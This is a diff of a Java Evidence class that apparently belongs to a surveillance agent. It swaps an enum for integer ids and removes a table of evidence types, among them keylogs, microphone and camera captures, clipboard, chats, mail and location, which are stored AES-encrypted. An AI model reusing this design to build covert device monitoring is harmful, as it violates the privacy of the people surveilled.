@@ -37,35 +37,7 @@ public final class Evidence {
 	/** The EVIDENCE delimiter. */
 	public static int EVIDENCE_DELIMITER = 0xABADC0DE;
 
-	/** The Constant TYPE_EVIDENCE. */
-	private static final EvidenceType[] TYPE_EVIDENCE = new EvidenceType[] {
-			EvidenceType.INFO,
-			EvidenceType.MAIL_RAW,
-			EvidenceType.ADDRESSBOOK,
-			EvidenceType.CALLLIST, // 0..3
-			EvidenceType.DEVICE,
-			EvidenceType.LOCATION,
-			EvidenceType.CALL,
-			EvidenceType.CALL_MOBILE, // 4..7
-			EvidenceType.KEYLOG, EvidenceType.SNAPSHOT,
-			EvidenceType.URL,
-			EvidenceType.CHAT, // 8..b
-			EvidenceType.MAIL, EvidenceType.MIC, EvidenceType.CAMSHOT,
-			EvidenceType.CLIPBOARD, // c..f
-			EvidenceType.NONE, EvidenceType.APPLICATION, // 10..11
-			EvidenceType.NONE // 12
-	};
 
-	/** The Constant MEMO_TYPE_EVIDENCE. */
-	public static final String[] MEMO_TYPE_EVIDENCE = new String[] { "INF",
-			"MAR", "ADD", "CLL", // 0..3
-			"DEV", "LOC", "CAL", "CLM", // 4..7
-			"KEY", "SNP", "URL", "CHA", // 8..b
-			"MAI", "MIC", "CAM", "CLI", // c..f
-			"NON", "APP", // 10..11
-			"NON" // 12
-
-	};
 
 	/** The Constant TAG. */
 	private static final String TAG = "Evidence";
@@ -104,7 +76,7 @@ public final class Evidence {
 	Device device;
 
 	/** The type evidence id. */
-	EvidenceType typeEvidenceId;
+	int typeEvidenceId;
 
 	/** The progressive. */
 	int progressive;
@@ -134,7 +106,7 @@ public final class Evidence {
 	 * @param aesKey
 	 *            the aes key
 	 */
-	public Evidence(final EvidenceType typeEvidenceId, final byte[] aesKey) {
+	public Evidence(final int typeEvidenceId, final byte[] aesKey) {
 		this();
 		if(Cfg.DEBUG) Check.requires(aesKey != null, "aesKey null");
 		// agent = agent_;
@@ -152,7 +124,7 @@ public final class Evidence {
 	 * @param typeEvidenceId
 	 *            the type evidence id
 	 */
-	public Evidence(final EvidenceType typeEvidenceId) {
+	public Evidence(final int typeEvidenceId) {
 		this(typeEvidenceId, Keys.self().getAesKey());
 	}
 
@@ -228,7 +200,7 @@ public final class Evidence {
 	 * @return true, if successful
 	 */
 	public synchronized boolean createEvidence(final byte[] additionalData,
-			final EvidenceType evidenceType) {
+			final int evidenceType) {
 
 		this.typeEvidenceId = evidenceType;
 		if(Cfg.DEBUG) Check.requires(fconn == null, "createLog: not previously closed");
@@ -247,7 +219,7 @@ public final class Evidence {
 		}
 
 		final Name name = evidenceCollector.makeNewName(this,
-				evidenceType.getMemo());
+				EvidenceType.getMemo(evidenceType));
 
 		progressive = name.progressive;
 
@@ -310,7 +282,7 @@ public final class Evidence {
 	 * @return the byte[]
 	 */
 	public byte[] makeDescription(final byte[] additionalData,
-			final EvidenceType evidenceType) {
+			final int evidenceType) {
 
 		if (timestamp == null) {
 			timestamp = new Date();
@@ -473,7 +445,7 @@ public final class Evidence {
 	 *            the content
 	 */
 	public void atomicWriteOnce(final byte[] additionalData,
-			final EvidenceType logType, final byte[] content) {
+			final int logType, final byte[] content) {
 		if (createEvidence(additionalData, logType)) {
 			writeEvidence(content);
 			if(Cfg.DEBUG) Check.ensures(getEncData().length % 16 == 0, "wrong len");
